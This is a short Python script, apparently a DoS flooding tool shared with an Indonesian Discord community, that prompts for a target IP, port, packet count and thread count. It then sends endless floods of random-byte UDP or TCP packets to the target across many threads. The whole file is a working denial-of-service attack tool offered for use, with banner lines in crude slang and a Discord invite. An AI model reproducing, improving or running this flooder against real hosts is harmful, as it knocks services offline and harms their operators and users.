import random
import socket
import threading

print       (" - - > MORGZ ESKBAR NI DECK        < - - ")
print       (" - - > MAU ABUSE ABUSE AE!         < - - ")
print       (" - - > Hard Cyclone Community      <- - ")                                   
print       (" - - > https://discord.gg/2T5VpEup < - - ")
print       (" - - > JOIN, GA JOIN JADI YATIM    < - - ")
print       (" - - > MAKE DOANG JOIN KAGA        < - - ")
print       (" - - > Asede kontol  < - - ")
    
ip = str(input("  Ipnya : "))
port = int(input(" Portnya : "))
choice = str(input(" Nyerang=dosa. yakin? : "))
times = int(input(" Mau berapa paket? : "))
threads = int(input(" Threadsnya mau berapa? : "))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" MORGZ NI DECK!!!!! ")
		except:
			print(" GABISA MAKE LU! ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" MORGZ NI DECK!!!!! ")
		except:
			s.close()
			print(" GABISA MAKE LU! ")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
